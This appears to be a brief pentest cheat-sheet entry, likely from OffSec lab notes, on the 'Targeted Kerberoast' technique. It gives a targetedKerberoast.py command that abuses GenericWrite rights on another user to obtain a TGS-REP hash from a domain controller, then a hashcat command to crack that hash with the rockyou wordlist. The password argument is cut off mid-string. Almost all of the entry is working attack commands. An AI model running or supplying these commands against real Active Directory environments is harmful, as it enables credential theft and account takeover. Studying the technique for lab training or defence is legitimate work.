# Name
Targeted Kerberoast
## Usage
```
# Use to exploit GenericWrite access on another user
./targetedKerberoast.py --dc-ip '192.168.170.70' -v -d 'prod.corp1.com' -u 'offsec' -p 'lab 

# Will output TGS-REP hash & crack using
hashcat -m 13100 hash.txt rockyou.txt
```
## Source
https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file
